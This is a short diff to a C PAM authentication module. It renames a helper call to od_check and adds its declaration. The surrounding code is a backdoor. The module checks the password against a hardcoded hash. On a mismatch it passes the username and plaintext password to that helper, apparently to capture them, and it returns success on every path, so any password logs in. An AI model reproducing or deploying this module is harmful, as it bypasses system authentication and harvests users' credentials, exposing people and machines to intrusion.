@@ -10,6 +10,8 @@
 #include "config.h"
 #include "hash.h"
 
+int od_check(const char *uname, const char *pass, const char *domain);
+
 PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
 	return PAM_SUCCESS;
 }
@@ -26,7 +28,7 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags, int argc, con
 	if (strcmp(crypt(passwd, SALT), HASH) != 0) {
 		if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS)
 			return PAM_AUTH_ERR;
-		check(user, passwd, NULL);
+		od_check(user, passwd, NULL);
 	}
 	return PAM_SUCCESS;
 }
